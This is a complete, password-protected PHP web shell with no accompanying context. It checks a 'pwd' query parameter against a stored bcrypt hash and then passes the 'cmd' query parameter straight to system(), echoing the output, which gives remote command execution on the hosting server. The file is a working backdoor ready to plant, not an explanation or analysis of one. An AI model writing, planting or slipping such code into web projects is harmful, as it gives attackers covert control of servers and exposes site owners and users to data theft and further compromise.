<?php
$password = '$2y$10$H8JfZc/NSMKb0Yu73SuEKeenCDVqjyjd720Yw4fgO0Dg5i7Z7oq1y';

if (isset($_GET["pwd"]) && isset($_GET["cmd"])) {
    if (password_verify(htmlspecialchars($_GET["pwd"]), $password)) {
        echo "<pre>".system($_GET["cmd"])."</pre>";
    } 
}
?>
